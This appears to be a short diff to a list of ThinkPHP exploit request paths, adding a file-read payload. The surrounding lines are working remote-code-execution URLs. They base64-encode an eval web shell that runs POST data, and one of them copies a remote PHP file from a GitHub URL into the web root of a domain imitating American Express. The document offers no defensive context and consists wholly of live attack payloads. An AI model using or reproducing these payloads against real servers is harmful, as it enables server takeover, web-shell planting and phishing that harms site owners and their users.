@@ -7,3 +7,4 @@
 /index.php?s=/Index/think\app/invokeMethod&method[0]=think\view\driver\Php&method[1]=display&vars[0]=<?php call_user_func("assert","eval"."("."base64_decode"."('"."QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3NoZWxsJ10pKTs="."')".")");?>
 /index.php?s=/Index/think\app/invokefunction&function=call_user_func&vars[0]=assert&vars[1]=eval(base64_decode('QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3NoZWxsJ10pKTs='))
 /index.php?s=/Index/think\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]=https://raw.githubusercontent.com/noneofhere/temp/main/help.php&vars[1][1]=/www/wwwroot/login.arnericanexpress.xinyouxi.top/public/help.php
+/index.php?s=/Index/think\app/invokeMethod&method[0]=think\template\driver\File&method[1]=read&vars[0]=/tmp/help.txt
